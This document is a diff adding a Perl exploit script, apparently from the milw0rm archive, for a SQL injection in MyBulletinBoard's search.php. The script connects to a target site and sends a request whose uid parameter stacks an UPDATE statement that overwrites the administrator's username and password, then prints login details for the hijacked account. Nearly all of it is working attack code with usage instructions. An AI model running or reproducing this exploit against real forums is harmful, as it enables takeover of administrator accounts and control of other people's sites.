@@ -1,0 +1,54 @@
+# mybb is dead /str0ke
+
+#!/usr/bin/perl
+######################################################################################
+#                              Crouz.Com Security Team                               #
+######################################################################################
+#    EXPLOIT FOR: MyBulletinBoard Search.PHP SQL Injection Vulnerability             #
+#                                                                                    #
+#Expl0it By: A l p h a _ P r o g r a m m e r (sirius)                                #
+#Email: Alpha_Programmer@LinuxMail.ORG                                               #
+#                                                                                    #
+#This Xpl Change Admin's Pass For L0gin With P0wer User                              #
+#                                                                                    #
+#HACKERS PAL & Devil-00 & ABDUCTER are credited with the discovery of this vuln      #
+#                                                                                    #
+######################################################################################
+# GR33tz T0 ==>  mh_p0rtal  --  Dr-CephaleX  --  The-Cephexin  -- Djay_Agoustinno    #
+#               No_Face_King --  Behzad185 -- Autumn_Love6(Hey Man You Are Singular) #
+#                                                                                    #
+#   Special Lamerz : Hoormazd  &  imm02tal  :P  ++ xshabgardx                        #
+######################################################################################
+
+use IO::Socket;
+
+if (@ARGV < 2)
+{
+  print "\n==========================================\n";
+  print " \n     -- Exploit By Alpha Programmer(sirius) --\n\n";
+  print "              Crouz Security Team      \n\n";
+  print "         Usage: <T4rg3t> <DIR>\n\n"; 
+  print "==========================================\n\n";
+  print "Examples:\n\n";
+  print "    Mybb.pl www.Site.com /mybb/ \n";
+  exit();
+
+}
+my $host = $ARGV[0];
+my $dir = $ARGV[1];
+my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, 
+PeerPort => "80" );
+unless ($remote) { die "C4nn0t C0nn3ct to $host" }
+print "C0nn3cted\n";
+$http = "GET $dir/search.php?action=finduser&uid=-1' ; update mybb_users set username='da05581c9137f901f4fa4da5a958c273' , password='da05581c9137f901f4fa4da5a958c273' where usergroup=4 and uid=1 HTTP/1.0\n";
+$http .= "Host: $host\n\n\n\n";
+print "\n";
+print $remote $http;
+print "Wait For Changing Password ...\n";
+sleep(10);
+print "OK , Now Login With :\n";
+print "Username: crouz\n";
+print "Password: crouz\n\n";
+print "Enjoy ;)\n\n";
+
+# milw0rm.com [2005-08-22]
